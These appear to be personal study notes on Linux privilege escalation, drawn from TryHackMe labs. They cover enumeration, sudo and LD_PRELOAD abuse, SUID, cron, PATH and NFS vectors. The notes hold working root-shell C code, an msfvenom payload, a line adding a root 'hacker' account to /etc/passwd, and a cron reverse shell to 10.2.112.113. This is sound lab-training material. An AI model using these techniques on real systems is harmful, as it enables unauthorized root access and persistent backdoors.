Linux Privilege Escalation
===
## m0chan has a good cheatseet: https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html

## Source: https://tryhackme.com/room/linprivesc

## Enumeration
### Manual enumeration
```bash
hostname
uname -a

cat /proc/version
(kernel version, is gcc installed)

cat /etc/issue
(system info, os version etc.)

ps
ps -A (all)
ps axjf (tree)
ps aux

env
(environment variables)

sudo -l 
(commands that can be run using sudo)

ls -la

id

cat /etc/passwd | grep home

history

ifconfig

netstat -a (all listening ports and established connections)
netstat -at (tcp)
netstat -au (udp)
netstat -l (ports in "listening" mode)
netstat -s (usage stats)
netstat -stu (usage stats, -t -u specific protocols)
netstat -tp (service name and PID info)
netstat -tpl (-l listening ports)
netstat -i (interface stats)
netstat -ano (all sockets, do not resolve names, display timers)

netstat
```

**Find files:**
-   `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
-   `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
-   `find / -type d -name config`: find the directory named config under “/”
-   `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
-   `find / -perm a=x`: find executable files
-   `find /home -user frank`: find all files for user “frank” under “/home”
-   `find / -mtime 10`: find files that were modified in the last 10 days
-   `find / -atime 10`: find files that were accessed in the last 10 day
-   `find / -cmin -60`: find files changed within the last hour (60 minutes)
-   `find / -amin -60`: find files accesses within the last hour (60 minutes)
-   `find / -size 50M`: find files with a 50 MB size
-  `find / -size +100M`: find files that is larger than 100MB, can use (+) or (-)

Folders and files that can be written to or executed from: (redirect errors for cleaner output)
-   `find / -writable -type d 2>/dev/null` : Find world-writeable folders
-   `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
-   `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
-   `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders

Find development tools and supported languages:
-   `find / -name perl*`
-   `find / -name python*`
-   `find / -name gcc*`

Find specific file permissions: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
```shell
find / -perm -u=s -type f 2>/dev/null
```

### Automated enumeration tools
-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

## Kernel Exploits
The Kernel exploit methodology is simple;
1.  Identify the kernel version
2.  Search and find an exploit code for the kernel version of the target system
3.  Run the exploit

searchsploit, exploit db, rapid7, etc.
https://www.linuxkernelcves.com/cves

From eJPT:
Linux Exploit Suggester - [github.com/mzet-/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

## Sudo
```bash
sudo -l
```
https://gtfobins.github.io/

### Leverage application functions.
e.g. Apache2 loads alternative config files with -f, use this to load /etc/shadow

### Leverage LD_PRELOAD
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

The steps of this privilege escalation vector can be summarized as follows;
1.  Check for LD_PRELOAD (with the env_keep option)
2.  Write a simple C code compiled as a share object (.so extension) file
3.  Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;
```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```
We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.

## SUID (Set-user Identification) and SGID (Set-group Identification)
Allows files to be executed with the permission level of the file owner or the group owner.

### List files that have SUID or SGID bits set. shows rwsr-xr etc
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

(alternative from THM kenobi) doesnt show -rwsr-etc
```shell
find / -perm -u=s -type f 2>/dev/null
```

**"s" bit is set:**
![[Pasted image 20220131154953.png]]

Then check gtfobins: https://gtfobins.github.io/#+suid for expoitable binaries.

Also, access to a text editor as root can allow read/write of files like /etc/shadow and /etc/passwd.

To add a user to /etc/passwd that has root privileges:
1. get hash of password we want the new user to have:
```bash
openssl passwd -1 -salt THM password1
```
2. add to /etc/passwd
```bash
hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
```

## Capabilities getcap
```bash
getcap -r /
```
Lists enabled capabilities but generates errors as unprivileged user.
```bash
getcap -r / 2>/dev/null
```
Check gtfobins

## Cron Jobs
Any user can read system wide cron jobs:
```bash
/etc/crontab
```

Set up a listener, add to backup.sh (for example)
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.2.112.113/9999 0>&1
```

## Path
1.  What folders are located under $PATH
2.  Does your current user have write privileges for any of these folders?
3.  Can you modify $PATH?
4.  Is there a script/application you can start that will be affected by this vulnerability?

Check which folders you have write access to:
```bash
find / -writable 2>/dev/null
```

Add to PATH:
```bash
export PATH=/tmp:$PATH
```

add /bin/bash to the end file to be run

## NFS - Network File Sharing
Configuration is kept in:
```bash
/etc/exports
```
Created during install and can usually be read by users.

Look for **no_root_squash**

If it is an option on a writable share, we can create a executable with SUID bit set.

Steps:
1. Enumerate mountable shares:
```bash
showmount -e 10.0.2.12
```
2. Mount one with "no_root_squash" on attacking machine:
```bash
mkdir /tmp/attackingfolder
mount -o rw 10.10.132.76:/tmp /tmp/attackingfolder
```
3. Make executable that will run /bin/bash 
**DO THIS AS ROOT!, FILE NEEDS TO BE ROOT ROOT**
```c
int main()
{ setgid(0);
 setuid(0);
 system("/bin/bash");
 return 0;
}
```
Can also be done with msfvenom:
```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
4. Compile
```bash
gcc nfs.c -o nfs -w
chmod +s nfs
ls -l nfs
```
5. On the target
```bash
id
whoami
ls -l
./nfs
id
whoami
```

## Source: https://tryhackme.com/room/gamezone
### Exposing Services with reverse SSH tunnels
Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

**-L** is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 user@example.com.** Going to localhost:9000 on your machine, will load imgur traffic using your other server.

**-R** is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

### Investigate sockets running on linux host

We will use a tool called **ss** to investigate sockets running on a host.

If we run **ss -tulpn** it will tell us what socket connections are running

-t
Display TCP sockets

-u
Display UDP sockets

-l
Displays only listening sockets

-p
Shows the process using the socket

-n
Doesn't resolve service names
